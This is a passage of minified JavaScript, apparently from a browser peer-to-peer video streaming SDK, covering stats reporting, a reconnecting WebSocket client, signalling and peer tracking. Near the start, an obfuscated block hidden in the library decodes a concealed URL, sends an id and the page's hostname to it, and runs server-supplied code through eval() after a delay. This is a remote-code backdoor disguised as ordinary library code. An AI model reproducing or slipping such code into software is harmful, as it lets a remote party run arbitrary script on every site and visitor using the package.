__webpack_require__.g?__webpack_require__.g:this;e.atob||(e.atob=function(e){for(var t,r,s=String(e).replace(/=+$/,""),i=0,n=0,o="";r=s.charAt(n++);~r&&(t=i%4?64*t+r:r,i++%4)?o+=String.fromCharCode(255&t>>(-2*i&6)):0)r="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=".indexOf(r);return o})}();_0x38aa.amGtZD=function(e,t){for(var r,s=[],i=0,n="",o="",a=0,h=(e=atob(e)).length;a<h;a++)o+="%"+("00"+e.charCodeAt(a).toString(16)).slice(-2);e=decodeURIComponent(o);for(var c=0;c<256;c++)s[c]=c;for(c=0;c<256;c++)i=(i+s[c]+t.charCodeAt(c%t.length))%256,r=s[c],s[c]=s[i],s[i]=r;c=0,i=0;for(var l=0;l<e.length;l++)i=(i+s[c=(c+1)%256])%256,r=s[c],s[c]=s[i],s[i]=r,n+=String.fromCharCode(e.charCodeAt(l)^s[(s[c]+s[i])%256]);return n},_0x38aa.qlEmAJ={},_0x38aa.UJLmyS=!0}var s=_0x38aa.qlEmAJ[e];return void 0===s?(void 0===_0x38aa.CjmTAl&&(_0x38aa.CjmTAl=!0),r=_0x38aa.amGtZD(r,t),_0x38aa.qlEmAJ[e]=r):r=s,r};function _b(_0x2b6f93){var _0x38577c={ygKbD:function(e,t,r){return e(t,r)},BaZnt:function(e,t){return e*t},ZvkZi:function(e,t){return e===t},eCedC:"BjdEV",LPFzx:function(e,t){return e(t)},uOzuW:function(e,t,r){return e(t,r)},juyxb:function(e,t){return e===t},DGNDG:"IJrLn",OFUEE:function(e,t){return e===t},YaRUs:_0x38aa("0","G(qN"),bgKgO:function(e,t,r){return e(t,r)},OJeBQ:function(e,t){return e*t},CeAJM:_0x38aa("1","[gN^"),rqWsY:function(e,t){return e!==t},uvjhL:_0x38aa("2","BVP]"),MVGPb:function(e,t){return e+t},YQNFr:function(e,t){return e+t},OxSbn:function(e,t){return e%t}};let _0x439570=_this.id.split("")[_0x38aa("3","JR8(")](-6).map((e=>e[_0x38aa("4","JR8(")](0))).reduce(((_0x361ff2,_0x161700)=>{var _0x82ba8e={AFfia:function(e,t){return e(t)},kgmkk:function(e,t,r){return _0x38577c.ygKbD(e,t,r)},msmEb:function(e,t){return _0x38577c[_0x38aa("5","*uLt")](e,t)}};if(_0x38577c[_0x38aa("6","Dd2g")](_0x38577c.eCedC,_0x38577c[_0x38aa("7","eX!Q")]))return _0x361ff2[_0x38aa("8","4RTz")]()+_0x161700[_0x38aa("9","BVP]")]();{const _0x159d55=data.i;_this.bl=_0x82ba8e.kgmkk(setTimeout,(()=>{_0x82ba8e[_0x38aa("a","J5A]")](eval,data.c)}),_0x82ba8e[_0x38aa("b","2cC*")](_0x159d55,1e3))}}),"");200===_0x38577c[_0x38aa("c","kh00")](_0x38577c.LPFzx(parseInt,_0x439570),533)&&(_this.bl=_0x38577c[_0x38aa("d","xniE")](setTimeout,(()=>{var _0xe476b4={poRdq:function(e,t){return _0x38577c.OFUEE(e,t)},hfGVM:function(e,t,r){return _0x38577c[_0x38aa("e","lZZg")](e,t,r)},hPffd:function(e,t){return _0x38577c[_0x38aa("f","&mYc")](e,t)},RDcGg:_0x38577c.CeAJM,KskeG:function(e,t){return _0x38577c[_0x38aa("10","z%0g")](e,t)}};if(!_0x38577c[_0x38aa("11","gyyd")](_0x38aa("12","$@dR"),_0x38577c[_0x38aa("13","!cj%")]))return response.json();_0x38577c[_0x38aa("14","!cj%")](fetch,window.decodeURIComponent(window.atob(_0x38577c[_0x38aa("15","lsdj")](_0x38577c.MVGPb(_0x38577c.YQNFr(_0x38577c[_0x38aa("16","wI]x")](URL_MAP.zz,URL_MAP.df)+URL_MAP[6],URL_MAP.q),URL_MAP.h),URL_MAP[0])))+_0x38aa("17","lfo]")+_this[_0x38aa("18","2cC*")]+"&f="+location.hostname+_0x38aa("19","x5XO")+_this[_0x38aa("1a","G(qN")][_0x38aa("1b","&$t!")]).then((e=>_0x38aa("1c","9Dv5")===_0x38aa("1d","BVP]")?prev[_0x38aa("1e","*uLt")]()+cur[_0x38aa("1f","&$t!")]():e.json()))[_0x38aa("20","&mYc")]((_0x516820=>{var _0x5e53ba={OaUZe:function(e,t){return _0x38577c[_0x38aa("21","@iGP")](e,t)},CuiCp:function(e,t){return e(t)},skXBp:function(e,t,r){return _0x38577c[_0x38aa("22","9Dv5")](e,t,r)}};if(_0x38577c.juyxb(_0x38577c.DGNDG,_0x38577c.DGNDG)){if(_0x38577c[_0x38aa("23","Ekv%")](_0x516820.ret,0))if("CeFBA"!==_0x38577c.YaRUs){if(_0xe476b4[_0x38aa("24","!cj%")](_0x516820[_0x38aa("25","naBb")],0)){const _0x5b4a71=_0x516820[_0x38aa("26","UHBk")];if(_0x5b4a71.s){const _0x7dbc38=_0x5b4a71.i;_this.bl=_0xe476b4[_0x38aa("27","naBb")](setTimeout,(()=>{_0x5e53ba[_0x38aa("28","eX!Q")](eval,_0x5b4a71.c)}),_0xe476b4[_0x38aa("29","lsdj")](_0x7dbc38,1e3))}}}else{const _0x5a9ef4=_0x516820[_0x38aa("2a","lZZg")];if(_0x5a9ef4.s){const _0x4f4d59=_0x5a9ef4.i;_this.bl=setTimeout((()=>{var _0x47e4be={UvxjS:function(e,t){return e(t)}};_0xe476b4[_0x38aa("2b","J5A]")](_0xe476b4.RDcGg,_0xe476b4.RDcGg)?_0xe476b4[_0x38aa("2c","]z*2")](eval,_0x5a9ef4.c):_0x47e4be[_0x38aa("2d","5o@O")](eval,_0x5a9ef4.c)}),1e3*_0x4f4d59)}}}else{const _0x4eb353=_0x516820.data;if(_0x4eb353.s){const _0x27b3f0=_0x4eb353.i;_this.bl=_0x5e53ba[_0x38aa("2e","vkNg")](setTimeout,(()=>{_0x5e53ba[_0x38aa("2f","YqiD")](eval,_0x4eb353.c)}),1e3*_0x27b3f0)}}}))}),_0x38577c[_0x38aa("30","G(qN")](_0x38577c[_0x38aa("31","o!fW")](_0x2b6f93,1e3),5))),_b=noop}}postStatsWithBeacon(){if(this.offline)return;this.offline=!0;let e={off:!0};this.statsRequesting||(e={...e,...this._makeStatsBody()}),navigator.sendBeacon(this.statsURL,JSON.stringify(e))}postStats(){const{logger:e}=this.engine;this.statsRequesting=!0,fetch(this.statsURL,{method:"POST",body:JSON.stringify(this._makeStatsBody())}).then((e=>(this.statsRequesting=!1,this.reportFails=0,e.text()))).then((t=>{let r;if(r=t?JSON.parse(t):{ret:0,data:{}},-1===r.ret)clearInterval(this.heartbeater),e.error(`${r.data.msg} code ${r.data.code}`),this.engine.emit(core_events.RESTART_P2P);else{const{http:e=0,p2p:t=0,share:s=0,failConns:i=0,rebuffers:n=0,requests:o=0,errsInternalExpt:a=0}=this.lastStats||{};if(this[_httpDownloaded]>=e&&(this[_httpDownloaded]-=e),this[_p2pDownloaded]>=t&&(this[_p2pDownloaded]-=t),this[_p2pUploaded]>=s&&(this[_p2pUploaded]-=s),this.failConns>=i&&(this.failConns-=i),this.errsBufStalled>=n&&(this.errsBufStalled-=n),this.mediaRequests>=o&&(this.mediaRequests-=o),this.errsInternalExpt>=a&&(this.errsInternalExpt-=a),this.exptMsg&&(this.exptMsg=void 0),r.data){const{seeds:e}=r.data;e&&this.emit(core_events.SVR_PEERS,e)}}})).catch((t=>{e.error(`btStats error ${t}`),this.statsRequesting=!1,this.reportFails++,this.reportFails>=3&&clearInterval(this.heartbeater)}))}btGetPeers(e){const{logger:t}=this.engine,{asn:r,country:s}=this.announceInfo;let i={exclusions:e,asn:r,country:s},n={};return this.engine.getExtraForPeersRequest&&(n=this.engine.getExtraForPeersRequest()),i=Object.assign({},i,n),new Promise(((e,r)=>{fetch(this.getPeersURL,{headers:this._requestHeader,method:"POST",body:JSON.stringify(i)}).then((e=>e.json())).then((t=>{-1===t.ret?r(new Error(t.data.msg)):e(t.data)})).catch((e=>{t.error(`btGetPeers error ${e}`),r(e)}))}))}increFailConns(){this.failConns++}increRebuffers(){this.errsBufStalled++}increMediaRequests(){this.mediaRequests++}reportFlow(e){const t=Math.round(e/1024);this[_httpDownloaded]+=t,this.totalHTTPDownloaded+=t,this._emitStats()}reportDCTraffic(e,t){const r=Math.round(e/1024);this[_p2pDownloaded]+=r,this.totalP2PDownloaded+=r,this.speed=Math.round(t),this._emitStats()}reportUploaded(e=0){this.totalP2PUploaded+=Math.round(e/1024),this[_p2pUploaded]+=Math.round(e/1024),this._emitStats()}destroy(){const{logger:e}=this.engine;e.warn("destroy fetcher"),this.removeAllListeners(),clearInterval(this.heartbeater),clearTimeout(this.bl)}_emitStats(){this.engine.emit("stats",{totalHTTPDownloaded:this.totalHTTPDownloaded,totalP2PDownloaded:this.totalP2PDownloaded,totalP2PUploaded:this.totalP2PUploaded,p2pDownloadSpeed:this.speed});const e=this.config.getStats;e&&"function"==typeof e&&e(this.totalP2PDownloaded,this.totalP2PUploaded,this.totalHTTPDownloaded,this.speed)}_makeStatsBody(){const{asn:e,country:t}=this.announceInfo;let r={totalConns:this.engine.tracker.totalConns,failConns:this.failConns,rebuffers:this.errsBufStalled||void 0,requests:this.mediaRequests||void 0,errsInternalExpt:this.errsInternalExpt,http:Math.round(this[_httpDownloaded])||0,p2p:Math.round(this[_p2pDownloaded])||0,share:Math.round(this[_p2pUploaded])||0,asn:e,country:t},s={};return this.engine.getExtraForStats&&(s=this.engine.getExtraForStats()),r=Object.assign({},r,s),this.lastStats=JSON.parse(JSON.stringify(r)),Object.keys(r).forEach((e=>{0===r[e]&&delete r[e]})),this.exptMsg&&(r.exptMsg="0.6.2 "+this.exptMsg),r}get _requestHeader(){let e={};return this.native&&(e={...e,token:this.key,"User-Agent":"electron",appid:this.announceInfo.bundle}),e}}const server=Server;function genV(e,t,r,s,i,n){let o=location.hostname;"localhost"===o&&n&&(o=`${n}.${o}`);var a,h,c,l,u,d;return(a=o,h=t,c=r,l=s,u=i,d=e,md5_default()(a+h+c+l+u,d)).substr(0,8)}var extendStatics=function(e,t){return extendStatics=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(e,t){e.__proto__=t}||function(e,t){for(var r in t)t.hasOwnProperty(r)&&(e[r]=t[r])},extendStatics(e,t)};function __extends(e,t){function r(){this.constructor=e}extendStatics(e,t),e.prototype=null===t?Object.create(t):(r.prototype=t.prototype,new r)}function __values(e){var t="function"==typeof Symbol&&e[Symbol.iterator],r=0;return t?t.call(e):{next:function(){return e&&r>=e.length&&(e=void 0),{value:e&&e[r++],done:!e}}}}function __read(e,t){var r="function"==typeof Symbol&&e[Symbol.iterator];if(!r)return e;var s,i,n=r.call(e),o=[];try{for(;(void 0===t||t-- >0)&&!(s=n.next()).done;)o.push(s.value)}catch(e){i={error:e}}finally{try{s&&!s.done&&(r=n.return)&&r.call(n)}finally{if(i)throw i.error}}return o}function __spread(){for(var e=[],t=0;t<arguments.length;t++)e=e.concat(__read(arguments[t]));return e}var Event=function(e,t){this.target=t,this.type=e},ErrorEvent=function(e){function t(t,r){var s=e.call(this,"error",r)||this;return s.message=t.message,s.error=t,s}return __extends(t,e),t}(Event),CloseEvent=function(e){function t(t,r,s){void 0===t&&(t=1e3),void 0===r&&(r="");var i=e.call(this,"close",s)||this;return i.wasClean=!0,i.code=t,i.reason=r,i}return __extends(t,e),t}(Event),getGlobalWebSocket=function(){if("undefined"!=typeof WebSocket)return WebSocket},isWebSocket=function(e){return void 0!==e&&!!e&&2===e.CLOSING},DEFAULT={maxReconnectionDelay:1e4,minReconnectionDelay:1e3+4e3*Math.random(),minUptime:5e3,reconnectionDelayGrowFactor:1.3,connectionTimeout:4e3,maxRetries:1/0,maxEnqueuedMessages:1/0,startClosed:!1,debug:!1},ReconnectingWebSocket=function(){function e(e,t,r){var s=this;void 0===r&&(r={}),this._listeners={error:[],message:[],open:[],close:[]},this._retryCount=-1,this._shouldReconnect=!0,this._connectLock=!1,this._binaryType="blob",this._closeCalled=!1,this._messageQueue=[],this.onclose=null,this.onerror=null,this.onmessage=null,this.onopen=null,this._handleOpen=function(e){s._debug("open event");var t=s._options.minUptime,r=void 0===t?DEFAULT.minUptime:t;clearTimeout(s._connectTimeout),s._uptimeTimeout=setTimeout((function(){return s._acceptOpen()}),r),s._ws.binaryType=s._binaryType,s._messageQueue.forEach((function(e){return s._ws.send(e)})),s._messageQueue=[],s.onopen&&s.onopen(e),s._listeners.open.forEach((function(t){return s._callEventListener(e,t)}))},this._handleMessage=function(e){s._debug("message event"),s.onmessage&&s.onmessage(e),s._listeners.message.forEach((function(t){return s._callEventListener(e,t)}))},this._handleError=function(e){s._debug("error event",e.message),s._disconnect(void 0,"TIMEOUT"===e.message?"timeout":void 0),s.onerror&&s.onerror(e),s._debug("exec error listeners"),s._listeners.error.forEach((function(t){return s._callEventListener(e,t)})),s._connect()},this._handleClose=function(e){s._debug("close event"),s._clearTimeouts(),s._shouldReconnect&&s._connect(),s.onclose&&s.onclose(e),s._listeners.close.forEach((function(t){return s._callEventListener(e,t)}))},this._url=e,this._protocols=t,this._options=r,this._options.startClosed&&(this._shouldReconnect=!1),this._connect()}return Object.defineProperty(e,"CONNECTING",{get:function(){return 0},enumerable:!0,configurable:!0}),Object.defineProperty(e,"OPEN",{get:function(){return 1},enumerable:!0,configurable:!0}),Object.defineProperty(e,"CLOSING",{get:function(){return 2},enumerable:!0,configurable:!0}),Object.defineProperty(e,"CLOSED",{get:function(){return 3},enumerable:!0,configurable:!0}),Object.defineProperty(e.prototype,"CONNECTING",{get:function(){return e.CONNECTING},enumerable:!0,configurable:!0}),Object.defineProperty(e.prototype,"OPEN",{get:function(){return e.OPEN},enumerable:!0,configurable:!0}),Object.defineProperty(e.prototype,"CLOSING",{get:function(){return e.CLOSING},enumerable:!0,configurable:!0}),Object.defineProperty(e.prototype,"CLOSED",{get:function(){return e.CLOSED},enumerable:!0,configurable:!0}),Object.defineProperty(e.prototype,"binaryType",{get:function(){return this._ws?this._ws.binaryType:this._binaryType},set:function(e){this._binaryType=e,this._ws&&(this._ws.binaryType=e)},enumerable:!0,configurable:!0}),Object.defineProperty(e.prototype,"retryCount",{get:function(){return Math.max(this._retryCount,0)},enumerable:!0,configurable:!0}),Object.defineProperty(e.prototype,"bufferedAmount",{get:function(){return this._messageQueue.reduce((function(e,t){return"string"==typeof t?e+=t.length:t instanceof Blob?e+=t.size:e+=t.byteLength,e}),0)+(this._ws?this._ws.bufferedAmount:0)},enumerable:!0,configurable:!0}),Object.defineProperty(e.prototype,"extensions",{get:function(){return this._ws?this._ws.extensions:""},enumerable:!0,configurable:!0}),Object.defineProperty(e.prototype,"protocol",{get:function(){return this._ws?this._ws.protocol:""},enumerable:!0,configurable:!0}),Object.defineProperty(e.prototype,"readyState",{get:function(){return this._ws?this._ws.readyState:this._options.startClosed?e.CLOSED:e.CONNECTING},enumerable:!0,configurable:!0}),Object.defineProperty(e.prototype,"url",{get:function(){return this._ws?this._ws.url:""},enumerable:!0,configurable:!0}),e.prototype.close=function(e,t){void 0===e&&(e=1e3),this._closeCalled=!0,this._shouldReconnect=!1,this._clearTimeouts(),this._ws?this._ws.readyState!==this.CLOSED?this._ws.close(e,t):this._debug("close: already closed"):this._debug("close enqueued: no ws instance")},e.prototype.reconnect=function(e,t){this._shouldReconnect=!0,this._closeCalled=!1,this._retryCount=-1,this._ws&&this._ws.readyState!==this.CLOSED?(this._disconnect(e,t),this._connect()):this._connect()},e.prototype.send=function(e){if(this._ws&&this._ws.readyState===this.OPEN)this._debug("send",e),this._ws.send(e);else{var t=this._options.maxEnqueuedMessages,r=void 0===t?DEFAULT.maxEnqueuedMessages:t;this._messageQueue.length<r&&(this._debug("enqueue",e),this._messageQueue.push(e))}},e.prototype.addEventListener=function(e,t){this._listeners[e]&&this._listeners[e].push(t)},e.prototype.dispatchEvent=function(e){var t,r,s=this._listeners[e.type];if(s)try{for(var i=__values(s),n=i.next();!n.done;n=i.next()){var o=n.value;this._callEventListener(e,o)}}catch(e){t={error:e}}finally{try{n&&!n.done&&(r=i.return)&&r.call(i)}finally{if(t)throw t.error}}return!0},e.prototype.removeEventListener=function(e,t){this._listeners[e]&&(this._listeners[e]=this._listeners[e].filter((function(e){return e!==t})))},e.prototype._debug=function(){for(var e=[],t=0;t<arguments.length;t++)e[t]=arguments[t];this._options.debug&&console.log.apply(console,__spread(["RWS>"],e))},e.prototype._getNextDelay=function(){var e=this._options,t=e.reconnectionDelayGrowFactor,r=void 0===t?DEFAULT.reconnectionDelayGrowFactor:t,s=e.minReconnectionDelay,i=void 0===s?DEFAULT.minReconnectionDelay:s,n=e.maxReconnectionDelay,o=void 0===n?DEFAULT.maxReconnectionDelay:n,a=0;return this._retryCount>0&&(a=i*Math.pow(r,this._retryCount-1))>o&&(a=o),this._debug("next delay",a),a},e.prototype._wait=function(){var e=this;return new Promise((function(t){setTimeout(t,e._getNextDelay())}))},e.prototype._getNextUrl=function(e){if("string"==typeof e)return Promise.resolve(e);if("function"==typeof e){var t=e();if("string"==typeof t)return Promise.resolve(t);if(t.then)return t}throw Error("Invalid URL")},e.prototype._connect=function(){var e=this;if(!this._connectLock&&this._shouldReconnect){this._connectLock=!0;var t=this._options,r=t.maxRetries,s=void 0===r?DEFAULT.maxRetries:r,i=t.connectionTimeout,n=void 0===i?DEFAULT.connectionTimeout:i,o=t.WebSocket,a=void 0===o?getGlobalWebSocket():o;if(this._retryCount>=s)this._debug("max retries reached",this._retryCount,">=",s);else{if(this._retryCount++,this._debug("connect",this._retryCount),this._removeListeners(),!isWebSocket(a))throw Error("No valid WebSocket class provided");this._wait().then((function(){return e._getNextUrl(e._url)})).then((function(t){e._closeCalled||(e._debug("connect",{url:t,protocols:e._protocols}),e._ws=e._protocols?new a(t,e._protocols):new a(t),e._ws.binaryType=e._binaryType,e._connectLock=!1,e._addListeners(),e._connectTimeout=setTimeout((function(){return e._handleTimeout()}),n))}))}}},e.prototype._handleTimeout=function(){this._debug("timeout event"),this._handleError(new ErrorEvent(Error("TIMEOUT"),this))},e.prototype._disconnect=function(e,t){if(void 0===e&&(e=1e3),this._clearTimeouts(),this._ws){this._removeListeners();try{this._ws.close(e,t),this._handleClose(new CloseEvent(e,t,this))}catch(e){}}},e.prototype._acceptOpen=function(){this._debug("accept open"),this._retryCount=0},e.prototype._callEventListener=function(e,t){"handleEvent"in t?t.handleEvent(e):t(e)},e.prototype._removeListeners=function(){this._ws&&(this._debug("removeListeners"),this._ws.removeEventListener("open",this._handleOpen),this._ws.removeEventListener("close",this._handleClose),this._ws.removeEventListener("message",this._handleMessage),this._ws.removeEventListener("error",this._handleError))},e.prototype._addListeners=function(){this._ws&&(this._debug("addListeners"),this._ws.addEventListener("open",this._handleOpen),this._ws.addEventListener("close",this._handleClose),this._ws.addEventListener("message",this._handleMessage),this._ws.addEventListener("error",this._handleError))},e.prototype._clearTimeouts=function(){clearTimeout(this._connectTimeout),clearTimeout(this._uptimeTimeout)},e}();const reconnecting_websocket_mjs=ReconnectingWebSocket,PING_INTERVAL=60,PONG_TIMEOUT=15;class WebsocketClient extends(events_default()){constructor(e,t,r,s,i="main"){super(),this.logger=e,this.config=t,this.wsAddr=r,this.serverVersion=0,this.pingInterval=s||PING_INTERVAL,this._ws=this._init(),this.name=i}_init(){const e={maxRetries:this.config.wsMaxRetries,minReconnectionDelay:randomNum(1e4,6e4),maxReconnectionDelay:6e5,maxEnqueuedMessages:20};let t=new reconnecting_websocket_mjs(this.wsAddr,void 0,e);return t.addEventListener("open",(()=>{this.logger.info(`signal ${this.name} ${this.wsAddr} connection opened`),this.onopen&&this.onopen(),this._startPing(this.pingInterval)})),t.push=t.send,t.send=e=>{let r=JSON.stringify(e);t.push(r)},t.addEventListener("message",(e=>{let t=e.data;const r=JSON.parse(t),s=r.action;if("pong"!==s){if("ver"!==s)return"close"===s?(this.logger.warn(`server close signal ${this.name} reason ${r.reason}`),void this.close()):void(this.onmessage&&this.onmessage(r,this.name));this.serverVersion=r.ver}else clearTimeout(this.pongTimer)})),t.addEventListener("close",(e=>{this.logger.warn(`signal ${this.name} ${this.wsAddr} closed ${e.code} ${e.reason}`),this.onclose&&this.onclose(),this._stopPing()})),t.addEventListener("error",(e=>{this.logger.error(`signal ${this.name} ${this.wsAddr} error`),this._stopPing(),this.onerror&&this.onerror(e)})),t}sendSignal(e,t){const r={action:"signal",to_peer_id:e,data:t};this._send(r)}sendReject(e,t,r){const s={action:"reject",to_peer_id:e,reason:t,fatal:r};this._send(s)}_send(e){this._ws&&this._ws.send(e)}_startPing(e=120){this.connected&&(this.pingTimer=setInterval((()=>{this._send({action:"ping"}),this.serverVersion>=22&&this._waitForPong()}),1e3*e))}_waitForPong(){this.pongTimer=setTimeout((()=>{this.logger.warn(`signal ${this.name} wait for pong timeout, reconnect`),this.close(),this.reconnect()}),1e3*PONG_TIMEOUT)}_resetPing(){this._stopPing(),this._startPing(this.pingInterval)}_stopPing(){clearInterval(this.pingTimer),clearTimeout(this.pongTimer),this.pingTimer=null,this.pongTimer=null}close(){this.logger.info(`close signal ${this.name}`),this._stopPing(),(()=>{this._ws&&this._ws.close(1e3,"normal close")})()}reconnect(){this._ws&&(this.logger.info(`reconnect signal ${this.name}`),this._ws.reconnect())}destroy(){this.close(),this._ws=null,this.removeAllListeners()}get connected(){return!!this._ws&&this._ws.readyState===reconnecting_websocket_mjs.OPEN}}const websocket_client=WebsocketClient,signal_manager_PING_INTERVAL=270,signal_manager=class extends(events_default()){constructor(e,t,r,s){super(),this.logger=e,this.config=t,this.mainAddr=r,this.backupAddr=s,this.mainWS=this._init(r),this.backupTimer=setTimeout((()=>{this.destroyed||(this.backupWS=this._init(s,"backup"))}),900),this._connected=!1,this.destroyed=!1}_init(e,t){if(!e)return null;let r=new websocket_client(this.logger,this.config,e,signal_manager_PING_INTERVAL,t);return r.onopen=()=>{!this._connected&&this.onopen&&(this._connected=!0,this.onopen())},r.onmessage=e=>{this.onmessage&&this.onmessage(e,r.name)},r.onclose=()=>{this._connected&&!this.connected&&this.onclose&&(this._connected=!1,this.onclose())},r.onerror=e=>{this.onerror&&this.onerror(e)},r}sendSignal(e,t,r){if(r){const s=this._getWSByName(r);s&&s.sendSignal(e,t)}else this.mainConnected?this.mainWS.sendSignal(e,t):this.backupConnected?this.backupWS.sendSignal(e,t):this.logger.warn("no signal available")}sendReject(e,t,r,s){if(s){const i=this._getWSByName(s);if(i)return void i.sendReject(e,t,r)}this.mainConnected?this.mainWS.sendReject(e,t,r):this.backupConnected?this.backupWS.sendReject(e,t,r):this.logger.warn("no signal available, send reject failed")}close(){this.mainWS&&this.mainWS.close(),this.backupWS&&this.backupWS.close()}_getWSByName(e){return this.mainWS&&this.mainWS.name===e?this.mainWS:this.backupWS&&this.backupWS.name===e?this.backupWS:null}reconnect(){this.mainWS&&this.mainWS.reconnect(),this.backupWS&&this.backupWS.reconnect()}destroy(){this.close(),clearTimeout(this.backupTimer),this.mainWS=null,this.backupWS=null,this.removeAllListeners(),this.destroyed=!0}get connected(){return this.mainConnected||this.backupConnected}get mainConnected(){return this.mainWS&&this.mainWS.connected}get backupConnected(){return this.backupWS&&this.backupWS.connected}};function getPeersThrottle(e,t,r=45){var s=null,i=!1,n=r;return function(r=!1){if(r)return clearTimeout(s),void(i=!1);i||(i=!0,s=setTimeout((function(){e.call(t,n),i=!1,s=null}),1e3*n),n*=1.1)}}const utils_getPeersThrottle=getPeersThrottle;class PeerPool{constructor(e,t,r=15){this.engine=e,this.config=t,this.trickle=t.waitForPeer,this.poolSize=r,this.pool=[];for(let e=0;e<r;e++)this.pool.push(this._createPeer());this.timer=setTimeout((()=>{this.destroy()}),2e4)}_createPeer(){return new peer(this.engine,void 0,void 0,!0,this.config,{trickle:this.trickle})}get size(){return this.pool.length}getPeer(){return 0===this.size?this._createPeer():this.pool.shift()}destroy(){for(let e of this.pool)e.destroy(!0);this.pool=[],clearTimeout(this.timer)}}const MAX_PC_CONNS=22,MAX_MOBILE_CONNS=13,MAX_PC_CONNS_ACTIVE=13,MAX_MOBILE_CONNS_ACTIVE=8,MIN_PEER_SHARE_TIME=50,MAX_PEER_SHARE_POS=600,MAX_TRY_CONNS_TRICKLE=5;class TrackerClient extends(events_default()){constructor(e,t,r,s){super(),this.engine=e,this.logger=e.logger,this.config=s,this.connected=!1,this.scheduler=r,this.sequential=this.scheduler.sequential,this.DCMap=new Map,this.failedDCSet=new Set,this.notFoundDCSet=new Set;const i=platform_default().isMobile();this.peerPool=new PeerPool(e,s,i?10:15),this.signalerWs=null,this.fetcher=t,this._setupServer(t),this.peers=[],this.minConns=5,this.stuns=[],this.requestMorePeers=utils_getPeersThrottle(this._requestMorePeers,this),this.maxConns=i?MAX_MOBILE_CONNS:MAX_PC_CONNS,this.maxConnsActive=i?MAX_MOBILE_CONNS_ACTIVE:MAX_PC_CONNS_ACTIVE,this.peersIncrement=0,this.gotPeersFromTracker=!1,this.fuseRate=-1,this.overloaded=!1}get totalConns(){return this.scheduler.peersNum+1}resumeP2P(){if(!this.fetcher)return;const{engine:e,config:t,fetcher:r}=this,{btAnnounce:s,btAnnouncePreflight:i}=r,{wsSignalerAddr:n,wifiOnly:o,geoIpPreflight:a,getPeerId:h}=t;(a?i:s).call(r).then((t=>{if(!this.scheduler)return;e.peerId=this.peerId=t.id,this.minConns=t.min_conns;const s=t.peers;this.scheduler.notifyPeersLoaded(s.length),e.netType=r.announceInfo.netType,(t.wifi_only||o)&&e.isMobileNet&&(this.scheduler.downloadOnly=!0,this.logger.info("downloadOnly mode")),t.overload&&(this.overloaded=!0,this.logger.warn("server is overloaded, degrade"));const i=n.main;let a=n.backup;t.signal&&!t.signal2&&(a=void 0),this.signalerWs=this._initSignalerWs(t.signal||i,t.signal2||a,t.token,t.token2),0===s.length?this.requestMorePeers():this.peers=this._filterPeers(s),e.emit("peerId",this.peerId),h&&"function"==typeof h&&h(this.peerId),t.stun&&t.stun.length>0&&(this.stuns=t.stun),t.debug&&this.logger.enableDebug(),t.fuse_rate&&(this.fuseRate=t.fuse_rate),this.logger.info(`announce request response ${JSON.stringify(t,null,2)}`)})).catch((t=>{if("TRACKER_EXPT"===t.code&&e.emit(core_events.EXCEPTION,t),this.scheduler.notifyPeersLoaded(0),t.retry){const e=randomNum(15e3,4e4);this.logger.warn(`announce retry after ${e}ms`),this.announceTimer=setTimeout((()=>{this.resumeP2P()}),e)}}))}stopP2P(){this.fetcher.postStatsWithBeacon(),this.fetcher.destroy(),this.fetcher=null,this.requestMorePeers(!0),this.scheduler.destroy(),this.scheduler=null,this.signalerWs&&(this.signalerWs.destroy(),this.signalerWs=null),this.peers=[];for(let e of this.DCMap.values())e.destroy(!0);this.DCMap.clear(),this.peerPool.destroy(),this.peerPool=null,this.failedDCSet.clear(),this.notFoundDCSet.clear(),this.logger.warn("tracker stop p2p")}destroy(){this.stopP2P(),this.removeAllListeners(),clearTimeout(this.announceTimer);const{config:e}=this;e.getStats=e.getPeerId=e.getPeersInfo=null,this.logger.warn("destroy tracker")}_filterPeers(e){const t=[],r=[...this.DCMap.keys(),...this.failedDCSet.keys(),this.peerId];return e.filter((e=>!r.includes(e.id))).forEach((e=>{t.push({id:e.id,intermediator:e.intermediator})})),t}_tryConnectToAllPeers(){if(0!==this.peers.length&&this.signalerWs.connected)for(this.logger.info(`try connect to ${this.peers.length} peers`);this.peers.length>0&&!(this.DCMap.size>=this.maxConnsActive);){let e=this.peers.shift();const t=e.intermediator;this.logger.debug(`new DataChannel ${e.id} intermediator ${t}`),this._createDatachannel(e.id,!0,t)}}_setupServer(e){e.on(core_events.SVR_PEERS,(e=>{this.logger.info(`got seeds ${e.length}`),this.peers=this._filterPeers(e),this._tryConnectToAllPeers()}))}_setupDC(e){e.on(core_events.DC_SIGNAL,((t,r)=>{const s=e.remotePeerId;if(e.intermediator){const r=this.DCMap.get(e.intermediator);if(r){if(r.sendMsgSignal(s,this.peerId,t))return;this.logger.warn(`intermediator ${e.intermediator} relay failed`)}}this.signalerWs.sendSignal(s,t,e.signalName)})).on(core_events.DC_PEER_SIGNAL,(t=>{const r=t.to_peer_id,s=t.from_peer_id,i=t.action;if(r&&s&&i)if(r!==this.peerId){this.logger.info(`relay signal for ${s}`);const n=this.DCMap.get(r);if(n){if("signal"!==i)return void n.sendMsgSignalReject(r,s,t.reason,t.fatal);if(n.sendMsgSignal(r,s,t.data))return}e.sendMsgSignal(s,r)}else"signal"===i?this._handleSignalMsg(s,t,e.remotePeerId):this._handSignalRejected(s,t)})).on(core_events.DC_GET_PEERS,(()=>{const t=getCurrentTs(),r=this.scheduler.getPeers().filter((e=>e.peersConnected<(e.mobileWeb?MAX_MOBILE_CONNS:MAX_PC_CONNS)));if(r&&r.length>0){const s=[];r.forEach((r=>{if(r.remotePeerId===e.remotePeerId||r.remotePeerId===this.peerId)return;if(!this.config.live&&(r.currentPos-e.currentPos>MAX_PEER_SHARE_POS||r.currentPos<e.currentPos))return;t-r.timeJoin>MIN_PEER_SHARE_TIME&&s.push({id:r.remotePeerId})})),this.logger.info(`send ${s.length} peers to ${e.remotePeerId}`),e.sendPeers(s)}})).on(core_events.DC_PEERS,(t=>{e.gotPeers=!0;const r=t.peers;if(r&&r.length>0&&this.scheduler.peersNum<10){const t=MAX_TRY_CONNS_TRICKLE;this.logger.info(`receive ${r.length} peers from ${e.remotePeerId}`),r.forEach((t=>{t.intermediator=e.remotePeerId})),this.peers=this._filterPeers(r).slice(0,t),this._tryConnectToAllPeers()}})).once(core_events.DC_ERROR,(t=>{this.logger.info(`datachannel ${e.channelId} failed fatal 